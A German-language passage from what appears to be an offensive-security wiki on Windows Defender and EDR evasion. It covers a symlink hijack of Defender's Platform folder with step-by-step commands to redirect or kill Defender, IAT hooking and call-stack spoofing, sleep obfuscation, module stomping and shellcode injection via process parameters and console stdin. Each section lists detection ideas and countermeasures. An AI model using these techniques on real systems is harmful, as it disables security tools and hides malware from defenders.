CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Hinweise und Einschränkungen
- Du kannst den Inhalt, den ClipUp schreibt, nicht kontrollieren, sondern nur dessen Platzierung; diese Primitive eignet sich für Beschädigungen, nicht für die präzise Einschleusung von Inhalten.
- Zum Installieren/Starten eines Dienstes und für ein Zeitfenster zum Neustart sind lokale Administratorrechte/SYSTEM erforderlich.
- Das Timing ist entscheidend: Das Ziel darf nicht geöffnet sein; die Ausführung beim Booten vermeidet Dateisperren.

Erkennungen
- Prozesserstellung von `ClipUp.exe` mit ungewöhnlichen Argumenten, insbesondere wenn der übergeordnete Prozess ein nicht standardmäßiger Launcher ist und dies rund um den Bootvorgang geschieht.
- Neue Dienste, die so konfiguriert sind, dass sie verdächtige Binärdateien automatisch starten und regelmäßig vor Defender/AV starten. Untersuche die Erstellung/Änderung von Diensten vor Fehlern beim Start von Defender.
- Datei-Integritätsüberwachung für Defender-Binärdateien/Platform-Verzeichnisse; unerwartete Dateierstellungen/-änderungen durch Prozesse mit Protected-Process-Flags.
- ETW/EDR-Telemetrie: Suche nach Prozessen, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, sowie nach anomaler PPL-Level-Nutzung durch Nicht-AV-Binärdateien.

Abwehrmaßnahmen
- WDAC/Code Integrity: Beschränke, welche signierten Binärdateien als PPL und unter welchen übergeordneten Prozessen ausgeführt werden dürfen; blockiere den Aufruf von ClipUp außerhalb legitimer Kontexte.
- Diensthygiene: Beschränke das Erstellen/Ändern von automatisch startenden Diensten und überwache Manipulationen der Startreihenfolge.
- Stelle sicher, dass Defender Tamper Protection und Early-Launch-Schutz aktiviert sind; untersuche Startfehler, die auf eine Beschädigung von Binärdateien hindeuten.
- Ziehe in Betracht, die Generierung von 8.3-Kurznamen auf Volumes mit Sicherheitstools zu deaktivieren, sofern dies mit deiner Umgebung kompatibel ist (gründlich testen).

## Manipulation von Microsoft Defender durch einen Symlink-Hijack des Platform-Versionsordners

Windows Defender wählt die Plattform, von der es ausgeführt wird, indem es Unterordner in folgendem Verzeichnis auflistet:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Es wählt den Unterordner mit der höchsten lexikografischen Versionszeichenfolge aus (z. B. `4.18.25070.5-0`) und startet dann die Defender-Dienstprozesse von dort (wobei die Dienst-/Registry-Pfade entsprechend aktualisiert werden). Bei dieser Auswahl werden Verzeichniseinträge einschließlich Directory Reparse Points (Symlinks) berücksichtigt. Ein Administrator kann dies ausnutzen, um Defender auf einen vom Angreifer beschreibbaren Pfad umzuleiten und DLL sideloading oder eine Dienstunterbrechung zu erreichen.<sup>[[21]](#references)[[22]](#references)</sup>

Voraussetzungen
- Lokaler Administrator (zum Erstellen von Verzeichnissen/Symlinks im Platform-Ordner erforderlich)
- Möglichkeit zum Neustart oder zum Auslösen einer erneuten Auswahl der Defender-Plattform (Neustart des Dienstes beim Booten)
- Es sind nur integrierte Tools erforderlich (`mklink`)

Warum es funktioniert
- Defender verhindert Schreibzugriffe in seinen eigenen Ordnern, aber bei der Auswahl der Plattform vertraut es den Verzeichniseinträgen und wählt die lexikografisch höchste Version aus, ohne zu prüfen, ob das Ziel auf einen geschützten/vertrauenswürdigen Pfad verweist.

Schritt für Schritt (Beispiel)
1) Erstelle einen beschreibbaren Klon des aktuellen Plattformordners, z. B. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Erstellen Sie innerhalb von Platform einen Verzeichnis-Symlink mit einer höheren Version, der auf Ihren Ordner verweist:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger-Auswahl (Neustart empfohlen):
```cmd
shutdown /r /t 0
```
4) Überprüfen Sie, dass MsMpEng.exe (WinDefend) vom umgeleiteten Pfad ausgeführt wird:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Du solltest den neuen Prozesspfad unter `C:\TMP\AV\` sowie die Dienstkonfiguration/Registry beobachten, die diesen Speicherort widerspiegeln.

Post-exploitation-Optionen
- DLL-Sideloading/Codeausführung: Lege DLLs ab bzw. ersetze DLLs, die Defender aus seinem Anwendungsverzeichnis lädt, um Code in den Prozessen von Defender auszuführen. Siehe den obigen Abschnitt: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Dienst-Kill/Denial: Entferne den Version-Symlink, damit sich der konfigurierte Pfad beim nächsten Start nicht auflösen lässt und Defender nicht startet:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Beachte, dass diese Technik allein keine Privilegienausweitung ermöglicht; sie erfordert Admin-Rechte.

## API/IAT Hooking + Call-Stack Spoofing mit PIC (im Stil von Crystal Kit)

Red Teams können Runtime-Evasion aus dem C2-Implantat in das Zielmodul selbst verlagern, indem sie dessen Import Address Table (IAT) hooken und ausgewählte APIs über angreifergesteuerten, positionsunabhängigen Code (PIC) leiten. Dadurch lässt sich die Evasion über die kleine API-Oberfläche hinaus verallgemeinern, die viele Kits bereitstellen (z. B. CreateProcessA), und derselbe Schutz auf BOFs und Post-Exploitation-DLLs ausweiten.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

High-Level-Ansatz
- Ein PIC-Blob mithilfe eines Reflective Loaders neben dem Zielmodul bereitstellen (vorangestellt oder als Begleitdatei). Der PIC muss eigenständig und positionsunabhängig sein.
- Beim Laden der Host-DLL ihre IMAGE_IMPORT_DESCRIPTOR durchlaufen und die IAT-Einträge für ausgewählte Imports (z. B. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) so patchen, dass sie auf schlanke PIC-Wrapper zeigen.
- Jeder PIC-Wrapper führt vor dem Tail-Call an die echte API-Adresse Evasions aus. Typische Evasions sind:
  - Speicher maskieren/demaskieren rund um den Aufruf (z. B. Beacon-Bereiche verschlüsseln, RWX→RX, Seitennamen/Berechtigungen ändern) und anschließend wiederherstellen.
  - Call-Stack-Spoofing: einen unauffälligen Stack aufbauen und zur Ziel-API wechseln, sodass die Call-Stack-Analyse die erwarteten Frames auflöst.<sup>[[9]](#references)</sup>
- Für Kompatibilität eine Schnittstelle exportieren, über die ein Aggressor-Skript (oder ein Äquivalent) registrieren kann, welche APIs für Beacon, BOFs und Post-Ex-DLLs gehookt werden sollen.

Warum hier IAT Hooking
- Funktioniert für jeden Code, der den gehookten Import verwendet, ohne den Tool-Code zu ändern oder sich darauf zu verlassen, dass Beacon bestimmte APIs proxyt.
- Deckt Post-Ex-DLLs ab: Durch das Hooking von LoadLibrary* lassen sich Modulladevorgänge abfangen (z. B. System.Management.Automation.dll, clr.dll) und dieselben Maskierungs- und Stack-Evasions auf deren API-Aufrufe anwenden.
- Ermöglicht wieder den zuverlässigen Einsatz von Post-Ex-Befehlen zum Starten von Prozessen gegen Erkennungen, die auf dem Call Stack basieren, indem CreateProcessA/W gewrappt wird.

Minimales IAT-Hook-Schema (x64-C/C++-Pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Hinweise
- Wende den Patch nach Relocations/ASLR und vor der ersten Verwendung des Imports an. Reflective Loader wie TitanLdr/AceLdr demonstrieren Hooking während des DllMain des geladenen Moduls.
- Halte Wrapper klein und PIC-sicher; löse die echte API über den ursprünglichen IAT-Wert auf, den du vor dem Patchen erfasst hast, oder über LdrGetProcedureAddress.
- Verwende für PIC RW → RX-Übergänge und hinterlasse keine Seiten mit Schreib- und Ausführungsberechtigung.

Call-stack-spoofing stub
- PIC-Stubs im Draugr-Stil erstellen eine gefälschte Aufrufkette (Rücksprungadressen in harmlosen Modulen) und springen dann zur echten API.
- Damit werden Erkennungen umgangen, die bei sensiblen APIs kanonische Stacks von Beacon/BOFs erwarten.
- Kombiniere das mit Stack-Cutting-/Stack-Stitching-Techniken, um vor dem API-Prolog in erwartete Frames zu gelangen.

Operative Integration
- Stelle den reflective Loader den Post-Ex-DLLs voran, damit PIC und Hooks beim Laden der DLL automatisch initialisiert werden.
- Verwende ein Aggressor-Skript, um Ziel-APIs zu registrieren, sodass Beacon und BOFs ohne Codeänderungen transparent denselben Evasion-Pfad nutzen.

Erkennungs-/DFIR-Aspekte
- IAT-Integrität: Einträge, die auf Nicht-Image-Adressen (Heap/anonym) zeigen; regelmäßige Überprüfung der Import-Pointer.
- Stack-Anomalien: Rücksprungadressen, die zu keinem geladenen Image gehören; abrupte Übergänge zu Nicht-Image-PIC; inkonsistente RtlUserThreadStart-Abstammung.
- Loader-Telemetrie: Schreibvorgänge im Prozess auf die IAT, frühe DllMain-Aktivitäten, die Import-Thunks verändern, unerwartete RX-Regionen, die beim Laden erstellt werden.
- Umgehung der Image-Ladetelemetrie: Wenn du LoadLibrary* hookst, überwache verdächtige Ladevorgänge von Automation-/clr-Assemblies, die mit Memory-Masking-Ereignissen korrelieren.

Verwandte Bausteine und Beispiele
- Reflective Loader, die während des Ladens IAT-Patching durchführen (z. B. TitanLdr, AceLdr)
- Memory-Masking-Hooks (z. B. simplehook) und Stack-Cutting-PIC (stackcutting)
- PIC-Call-Stack-Spoofing-Stubs (z. B. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-Time-IAT-Hooks über ein residenten PICO

Wenn du einen reflective Loader kontrollierst, kannst du Imports **während** `ProcessImports()` hooken, indem du den `GetProcAddress`-Pointer des Loaders durch einen benutzerdefinierten Resolver ersetzt, der zuerst Hooks prüft:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Erstelle ein **resident PICO** (persistentes PIC-Objekt), das bestehen bleibt, nachdem sich das temporäre Loader-PIC selbst freigegeben hat.
- Exportiere eine `setup_hooks()`-Funktion, die den Import-Resolver des Loaders überschreibt (z. B. `funcs.GetProcAddress = _GetProcAddress`).
- Überspringe in `_GetProcAddress` Ordinal-Imports und verwende eine hashbasierte Hook-Suche wie `__resolve_hook(ror13hash(name))`. Gibt es einen Hook, gib ihn zurück; andernfalls delegiere an das echte `GetProcAddress`.
- Registriere Hook-Ziele zur Link-Zeit mit Crystal-Palace-Einträgen der Form `addhook "MODULE$Func" "hook"`. Der Hook bleibt gültig, weil er sich innerhalb des residenten PICO befindet.

So erhältst du **IAT-Umleitung zur Import-Zeit**, ohne den Codebereich der geladenen DLL nach dem Laden zu patchen.

### Erzwingen hookbarer Imports, wenn das Ziel PEB-Walking verwendet

Import-Time-Hooks werden nur ausgelöst, wenn die Funktion tatsächlich in der IAT des Ziels steht. Wenn ein Modul APIs über einen PEB-Walk + Hash auflöst (ohne Import-Eintrag), erzwinge einen echten Import, damit der `ProcessImports()`-Pfad des Loaders ihn erfasst:

- Ersetze die Auflösung gehashter Exports (z. B. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) durch eine direkte Referenz wie `&WaitForSingleObject`.
- Der Compiler erzeugt einen IAT-Eintrag, wodurch die Abfangung beim Auflösen der Imports durch den reflective Loader ermöglicht wird.

### Ekko-artige Sleep-/Idle-Obfuscation ohne Patchen von `Sleep()`

Statt `Sleep` zu patchen, hooke die **tatsächlich vom Implantat verwendeten Wait-/IPC-Primitiven** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Umschließe bei langen Wartezeiten den Aufruf mit einer Ekko-artigen Obfuscation-Kette, die das Image im Speicher während der Leerlaufzeit verschlüsselt:<sup>[[31]](#references)[[27]](#references)</sup>

- Verwende `CreateTimerQueueTimer`, um eine Folge von Callbacks zu planen, die `NtContinue` mit präparierten `CONTEXT`-Frames aufrufen.
- Typische Kette (x64): Image auf `PAGE_READWRITE` setzen → per RC4 mit `advapi32!SystemFunction032` das gesamte gemappte Image verschlüsseln → den blockierenden Wait ausführen → per RC4 entschlüsseln → **abschnittsspezifische Berechtigungen wiederherstellen**, indem die PE-Sections durchlaufen werden → Abschluss signalisieren.
- `RtlCaptureContext` liefert eine `CONTEXT`-Vorlage. Klone sie in mehrere Frames und setze Register (`Rip/Rcx/Rdx/R8/R9`), um jeden Schritt aufzurufen.

Operatives Detail: Gib bei langen Waits (z. B. `WAIT_OBJECT_0`) „success“ zurück, damit der Aufrufer fortfährt, während das Image maskiert ist. Dieses Muster verbirgt das Modul während Leerlaufphasen vor Scannern und vermeidet die klassische Signatur eines „gepatchten `Sleep()`“.

Erkennungsideen (telemetriebasiert)
- Serien von `CreateTimerQueueTimer`-Callbacks, die auf `NtContinue` zeigen.
- Verwendung von `advapi32!SystemFunction032` auf großen zusammenhängenden Puffern in Image-Größe.
- `VirtualProtect` auf großen Speicherbereichen, gefolgt von der benutzerdefinierten Wiederherstellung abschnittsspezifischer Berechtigungen.

### Laufzeitregistrierung von CFG-Zielen für Sleep-Obfuscation-Gadgets

Auf CFG-aktivierten Zielen führt der erste indirekte Sprung zu einem Gadget innerhalb einer Funktion, etwa `jmp [rbx]` oder `jmp rdi`, normalerweise zum Absturz des Prozesses mit `STATUS_STACK_BUFFER_OVERRUN`, weil das Gadget nicht in den CFG-Metadaten des Moduls enthalten ist. Damit Ekko-/Kraken-artige Ketten in gehärteten Prozessen funktionieren:<sup>[[30]](#references)</sup>

- Registriere jedes von der Kette verwendete indirekte Ziel mit `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` und `CFG_CALL_TARGET_VALID`-Einträgen.
- Für Adressen in geladenen Images (`ntdll`, `kernel32`, `advapi32`) muss der `MEMORY_RANGE_ENTRY` an der **Image-Basis** beginnen und die **gesamte Image-Größe** abdecken.
- Verwende für manuell gemappte/PIC-/gestompte Bereiche stattdessen die **Allokationsbasis** und die Allokationsgröße.
- Markiere nicht nur das Dispatch-Gadget, sondern auch indirekt erreichte Exports (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, Wait-/Event-Systemaufrufe) sowie alle ausführbaren, vom Angreifer kontrollierten Sections, die zu indirekten Zielen werden.

Dadurch werden Sleep-Ketten im ROP-/JOP-Stil von einer „funktioniert nur in Nicht-CFG-Prozessen“-Technik zu einem wiederverwendbaren Primitiv für `explorer.exe`, Browser, `svchost.exe` und andere mit `/guard:cf` kompilierte Endpunkte.

### CET-sicheres Stack-Spoofing für schlafende Threads

Der vollständige Austausch von `CONTEXT` ist auffällig und kann auf CET-Shadow-Stack-Systemen fehlschlagen, da ein gefälschtes `Rip` weiterhin mit dem Hardware-Shadow-Stack übereinstimmen muss. Ein sichereres Sleep-Masking-Muster ist:<sup>[[30]](#references)</sup>

- Wähle einen anderen Thread desselben Prozesses und lies über `NtQueryInformationThread` dessen `NT_TIB`-/TEB-Stackgrenzen (`StackBase`, `StackLimit`) aus.
- Sichere den echten TEB/TIB des aktuellen Threads.
- Erfasse mit `GetThreadContext` den echten Kontext des schlafenden Threads.
- Kopiere **nur** das echte `Rip` in den Spoof-Kontext und lasse den gefälschten `Rsp`-/Stack-Zustand unverändert.
- Kopiere während des Sleep-Fensters den `NT_TIB` des Spoof-Threads in den TEB des aktuellen Threads, damit Stack-Walker innerhalb eines legitimen Stack-Bereichs zurückverfolgen.
- Stelle nach Abschluss des Waits den ursprünglichen TIB und Thread-Kontext wieder her.

Dadurch bleibt der Instruction Pointer CET-konform, während EDR-Stack-Walker irregeführt werden, die TEB-Stack-Metadaten zur Validierung des Unwindings heranziehen.

### APC-basierte Alternative: Kraken Mask

Wenn der Timer-Queue-Dispatch zu stark signaturbasiert ist, lässt sich dieselbe Sleep-Encrypt-Spoof-Restore-Sequenz über einen angehaltenen Hilfsthread mit eingereihten APCs ausführen:<sup>[[27]](#references)</sup>

- Erstelle einen Hilfsthread mit `NtTestAlert` als Einstiegspunkt.
- Reiht vorbereitete `CONTEXT`-Frames/APCs mit `NtQueueApcThread` ein und arbeite sie mit `NtAlertResumeThread` ab.
- Speichere den Kettenzustand auf dem Heap statt auf dem Stack des Hilfsthreads, um eine Erschöpfung des standardmäßigen 64-KB-Thread-Stacks zu vermeiden.
- Verwende `NtSignalAndWaitForSingleObject`, um das Start-Event atomar zu signalisieren und zu blockieren.
- Halte den Hauptthread an, bevor du TIB/Kontext wiederherstellst (`NtSuspendThread` → Wiederherstellen → `NtResumeThread`), um das Zeitfenster zu verkleinern, in dem ein Scanner einen nur teilweise wiederhergestellten Stack erfassen könnte.

Damit wird die Signatur `CreateTimerQueueTimer` + `NtContinue` durch eine Hilfsthread-/APC-Signatur ersetzt, während dieselben Ziele für RC4-Masking und Stack-Spoofing erhalten bleiben.

Zusätzliche Erkennungsideen
- `NtSetInformationVirtualMemory` mit `VmCfgCallTargetInformation` kurz vor Sleep-Phasen, Waits oder APC-Dispatch.
- `GetThreadContext`/`SetThreadContext` in Kombination mit `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` oder `ConnectNamedPipe`.
- Auf `NtQueryInformationThread` folgende direkte Schreibzugriffe auf die Stackgrenzen des TEB/TIB des aktuellen Threads.
- `NtQueueApcThread`-/`NtAlertResumeThread`-Ketten, die indirekt `SystemFunction032`, `VirtualProtect` oder Hilfsfunktionen zur Wiederherstellung von Section-Berechtigungen aufrufen.
- Wiederholte Verwendung kurzer Gadget-Signaturen wie `FF 23` (`jmp [rbx]`) oder `FF E7` (`jmp rdi`) als Dispatch-Pivots innerhalb signierter Module.


## Precision Module Stomping

Beim Module Stomping werden Payloads aus dem **`.text`-Abschnitt einer DLL ausgeführt, die bereits im Zielprozess gemappt ist**, statt auffälligen privaten ausführbaren Speicher zuzuweisen oder eine neue entbehrliche DLL zu laden. Das Überschreibeziel sollte ein **geladenes, dateigestütztes Image** sein, dessen Codebereich die Payload aufnehmen kann, ohne noch benötigte Codepfade des Prozesses zu beschädigen.<sup>[[1]](#references)[[2]](#references)</sup>

### Zuverlässige Zielauswahl

Naives Stomping auf gängige Module wie `uxtheme.dll` oder `comctl32.dll` ist fragil: Die DLL ist möglicherweise nicht im Remote-Prozess geladen, und ein zu kleiner Codebereich führt zum Absturz des Prozesses. Ein zuverlässigerer Ablauf:

1. Zähle die Module des Zielprozesses auf und behalte eine **Nur-Namen-Include-Liste** der bereits geladenen DLLs.
2. Erstelle zuerst die Payload und notiere ihre **exakte Byte-Größe**.
3. Durchsuche DLLs auf der Festplatte und vergleiche `Misc_VirtualSize` des PE-Abschnitts **`.text`** mit der Payload-Größe. Das ist wichtiger als die Dateigröße, da dieser Wert die Größe des ausführbaren Abschnitts **im gemappten Speicher** widerspiegelt.
4. Parse die **Export Address Table (EAT)** und wähle die RVA einer exportierten Funktion als Start-Offset für das Stomping.
5. Berechne den **Kollateralschaden**: Wenn die Payload die Grenze der ausgewählten Funktion überschreitet, überschreibt sie benachbarte, danach im Speicher angeordnete Exports.

Typische Recon-/Auswahl-Hilfsprogramme aus der Praxis:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Hinweise zum Betrieb
- Bevorzuge DLLs, die im Remote-Prozess **bereits geladen** sind, um die Telemetrie von `LoadLibrary`/unerwarteten Image-Ladevorgängen zu vermeiden.
- Bevorzuge Exports, die von der Zielanwendung nur selten ausgeführt werden; andernfalls können normale Codepfade die gestompten Bytes vor oder nach der Thread-Erstellung ausführen.
- Bei großen Implants muss die Einbettung des Shellcodes häufig von einem Stringliteral auf einen **Byte-Array-/Braced-Initializer** umgestellt werden, damit der vollständige Puffer im Quellcode des Injectors korrekt dargestellt wird.

Ideen zur Erkennung
- Schreibvorgänge in Remote-Prozesse auf **ausführbare, image-backed Seiten** (`MEM_IMAGE`, `PAGE_EXECUTE*`) statt auf die häufigeren privaten RWX-/RX-Allokationen.
- Export-Einstiegspunkte, deren Bytes im Speicher nicht mehr mit der zugrunde liegenden Datei auf der Festplatte übereinstimmen.
- Remote-Threads oder Kontextwechsel, deren Ausführung innerhalb eines legitimen DLL-Exports beginnt, dessen erste Bytes kürzlich geändert wurden.
- Verdächtige Sequenzen aus `VirtualProtect(Ex)` / `WriteProcessMemory` auf DLL-`.text`-Seiten, gefolgt von einer Thread-Erstellung.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ist eine **Prozessinjektions-/EDR-Umgehungstechnik**, die den klassischen Remote-Schreibpfad (`VirtualAllocEx` + `WriteProcessMemory`) vermeidet. Anstatt Bytes in ein bereits laufendes Ziel zu kopieren, nutzt sie aus, dass Windows **ausgewählte Startparameter von `CreateProcessW` in den Kindprozess kopiert** und sie in `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) speichert.<sup>[[28]](#references)[[29]](#references)</sup>

### Durch `CreateProcessW` kopierbare Träger

Nützliche Träger sind:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (mit `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktische Einschränkungen der Träger:

- `lpCommandLine` muss für `CreateProcessW` auf **beschreibbaren Speicher** zeigen und ist auf **32.767 Unicode-Zeichen** einschließlich des Nullterminators begrenzt.
- `lpEnvironment` muss ein Unicode-Umgebungsblock aus aufeinanderfolgenden `NAME=VALUE\0`-Strings sein, auf die ein zusätzliches `\0` folgt.
- `lpReserved` ist offiziell reserviert; daher sollte das `ShellInfo`-Mapping als Implementierungsdetail und nicht als stabiler, dokumentierter Vertrag betrachtet werden.

Dadurch wird die normale Prozesserstellung zum **Payload-Transfer-Primitiv**. Der Operator erstellt den Kindprozess mit vom Angreifer kontrollierten Startdaten und lässt Windows die prozessübergreifende Kopie durchführen.

### Remote-Suchablauf ohne Remote-Schreib-APIs

Nachdem der Kindprozess erstellt wurde, wird der kopierte Puffer mit **schreibgeschützten** Primitiven aufgelöst:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` abrufen
2. Den Remote-`PEB` lesen
3. `PEB.ProcessParameters` folgen
4. `RTL_USER_PROCESS_PARAMETERS` lesen
5. Den ausgewählten Zeiger verwenden:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimaler Ablauf:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Ausführen des kopierten Parameterpuffers

Der kopierte Parameterbereich ist normalerweise `RW`, nicht ausführbar. Eine gängige P3-Kette sieht so aus:

1. Prozess normal erstellen (nicht angehalten)
2. Die ausgewählte Parameterseite mit `NtProtectVirtualMemory` / `VirtualProtectEx` ausführbar machen
3. Den bereits in `PROCESS_INFORMATION` zurückgegebenen Handle des Hauptthreads wiederverwenden
4. Die Ausführung mit `NtSetContextThread` umleiten (`CONTEXT_CONTROL`, `RIP` überschreiben)

Im Gegensatz zu klassischen Thread-Hijacking-Abläufen sind dafür **weder `SuspendThread` noch `ResumeThread` erforderlich**; der Kontext lässt sich direkt über den zurückgegebenen Handle des Hauptthreads ändern.

Dadurch werden mehrere APIs umgangen, die häufig auf Injection überwacht werden:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- häufig auch `SuspendThread` / `ResumeThread`

### Einschränkung durch Nullbytes und gestaffelter Shellcode

Alle drei Träger bestehen aus **String- oder stringartigen Daten**, daher wird eine rohe Payload mit `0x00` bei der Übertragung abgeschnitten. Eine praktische Lösung ist eine **nullbytefreie erste Stufe**, die Konstanten zur Laufzeit rekonstruiert und anschließend eine beliebige zweite Stufe lädt.

Ein einfaches Muster ist die XOR-basierte Synthese von Konstanten:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Damit kann die erste Stufe Stack-Strings, API-Argumente, DLL-Pfade oder einen Shellcode-Loader der zweiten Stufe erstellen, ohne Null-Bytes in den übertragenen Parameter einzubetten.

### Stack-basierte API-Aufrufe aus der ersten Stufe

Wenn die erste Stufe APIs wie `LoadLibraryA` aufrufen muss, kann sie:

- den String/Puffer auf den Ziel-Stack legen
- den **32-Byte-x64-Shadow-Space** reservieren
- `RCX`, `RDX`, `R8`, `R9` auf Konstanten oder `RSP`-relative Zeiger setzen
- `RSP` vor dem Aufruf **16-Byte-ausgerichtet** halten

Eine zweite Stufe kann anschließend vom Stack in eine `PAGE_READWRITE`-Allokation kopiert, mit `VirtualProtect` auf `PAGE_EXECUTE_READ` umgestellt und angesprungen werden, wodurch eine direkte RWX-Allokation vermieden wird.

### Erkennungsideen

Gute Hunting-Möglichkeiten, die von den Autoren genannt werden:

- `VirtualProtectEx` / `NtProtectVirtualMemory`, das **Prozessparameter-Seiten ausführbar** macht
- dieser Schutzwechsel gefolgt von `SetThreadContext` / `NtSetContextThread`
- Remote-Lesezugriffe auf `PEB` und danach auf `RTL_USER_PROCESS_PARAMETERS`
- ungewöhnlich lange Werte oder Werte mit hoher Entropie für `lpCommandLine`, `lpEnvironment` oder `STARTUPINFO.lpReserved` während der Prozesserstellung

### Hinweise

- P3 ist ein **prozessübergreifender Übertragungstrick** und für sich genommen keine vollständige Ausführungsprimitive: Für den kopierten Parameter sind weiterhin eine Änderung der Ausführungsberechtigungen und eine Methode zur Ausführungsumleitung erforderlich.
- `RtlCreateProcessReflection` / Dirty Vanity wurde von den Autoren in Betracht gezogen, aber verworfen, weil intern verdächtige Primitive wie `NtWriteVirtualMemory` und `NtCreateThreadEx` verwendet werden.

Informationen zur Payload-Zustellung in einen **bestehenden** Windows-Prozess über Thread-Beschreibungen mit anschließendem Hijacking der Rücksprungadresse eines wartenden Threads finden Sie unter [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Console-STDIN-Pipe-Injection

Ein interaktiver Konsolenprozess kann ebenfalls als **Payload-Transferprimitive** dienen. Der Injector leitet die Standardeingabe des Child-Prozesses auf eine Pipe um und sendet einen Marker gefolgt von Shellcode. Nachdem das Konsolenprogramm die Daten in seinen eigenen privaten Speicher eingelesen hat, findet der Injector diesen Puffer, macht ihn ausführbar und leitet einen Child-Thread dorthin um. Dadurch werden `VirtualAllocEx` und `WriteProcessMemory` vermieden, aber es handelt sich weiterhin um Process Injection und nicht um einen allgemeinen EDR-Bypass.<sup>[[41]](#references)</sup>

Trotz der Beschreibung als „named-pipe“ ruft die Referenzimplementierung `CreatePipe` auf, wodurch eine **anonyme Pipe** erstellt wird. Windows implementiert anonyme Pipes intern mit eindeutig benannten Pipe-Objekten, aber der PoC wählt weder einen `\\.\pipe\<name>`-Pfad aus noch ruft er `CreateNamedPipe` auf. Er erstellt vererbbare Handles mit einem Standard-Sicherheitsdeskriptor, legt das Lese-Handle in `STARTUPINFO.hStdInput` ab, setzt `STARTF_USESTDHANDLES` und startet einen neuen Child-Prozess mit aktivierter Handle-Vererbung. Daher startet dieser PoC die angegebene Konsolenanwendung; er verbindet seine Pipe nicht mit einem bestehenden Prozess.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referenz-Workflow

Die Implementierung verwendet die folgende Abfolge:<sup>[[41]](#references)</sup>

1. Anonyme Pipe-Paare für `STDIN` und `STDOUT` des Child-Prozesses erstellen. Die Vererbung der beiden Handles auf der Parent-Seite deaktivieren und nach der Prozesserstellung die Duplikate der Child-Seite im Parent-Prozess schließen.
2. Eine interaktive ausführbare Datei wie `netsh.exe` oder `nslookup.exe` mit `CREATE_NEW_CONSOLE` starten. Der Child-Prozess erbt die umgeleiteten Standard-Handles.
3. Das vollständige binäre `rawData`-Array mit `WriteFile` über das `STDIN`-Handle auf der Parent-Seite senden. Das Konsolenprogramm verarbeitet die Bytes und hinterlässt eine Kopie in einer seiner privaten, committeten Speicherregionen.
4. Den Adressraum des Child-Prozesses mit `VirtualQueryEx` durchlaufen, mögliche `MEM_PRIVATE`-Regionen mit `ReadProcessMemory` lesen und nach dem Marker am Anfang von `rawData` suchen.
5. Den gefundenen Puffer mit `VirtualProtectEx` auf `PAGE_EXECUTE_READWRITE` umstellen.
6. Den Hauptthread identifizieren, anhalten, `RIP` mit `NtSetContextThread` auf `found_address + 0x19` setzen und ihn fortsetzen.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

